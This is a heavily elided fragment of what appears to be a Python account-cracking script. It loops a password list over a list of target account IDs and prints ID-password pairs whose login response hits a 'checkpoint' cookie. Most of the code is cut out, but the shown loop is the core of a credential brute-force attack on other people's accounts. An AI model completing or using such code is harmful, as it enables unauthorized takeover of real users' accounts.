...
def login_lagi334():
	try:
		...
		os.system("play-audio Assalamualaikum.mp3 ")
...
def passwrd():
	...
	print(f"\x1b[1;91m [🚀] \x1b[1;92m TOTAL ID          \x1b[1;91m➢ \x1b[1;92m"+str(len(id)))
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r \x1b[1;91m TBS-CHECKPOINT [🥶] {idf} | {pw}{N}')     
